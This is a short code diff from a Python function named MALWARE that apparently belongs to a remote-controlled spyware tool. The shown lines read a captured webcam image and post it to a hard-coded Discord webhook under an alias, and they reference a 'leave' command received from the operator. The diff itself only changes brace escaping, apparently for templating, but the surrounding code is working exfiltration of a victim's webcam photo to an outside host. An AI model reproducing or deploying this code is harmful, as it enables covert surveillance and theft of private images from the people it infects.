@@ -151,11 +151,11 @@ def MALWARE():
                 IMAGE.read()
                 
            WEBHOOK = "https://discord.com/api/webhooks/1165737675635036200/jnvMkGQnYcEHQ1fjuAFKxfwCkNM729umhnG4n_0t8he2bOkiKGbsayb6mo0EpYKzTymK"
-           FILES = {"file1": open("WEBCAM.jpg", "rb")}
-           DATA = {
+           FILES = {{"file1": open("WEBCAM.jpg", "rb")}}
+           DATA = {{
                "username": "Сидиус",
                "avatar_url":"https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Sith_Emblem_(Star_Wars).svg/langfr-280px-Sith_Emblem_(Star_Wars).svg.png"
-           }
+           }}
            RESPONSE = requests.post(WEBHOOK, data=DATA, files=FILES)        
 
         if MALWARE_RECV == "leave":
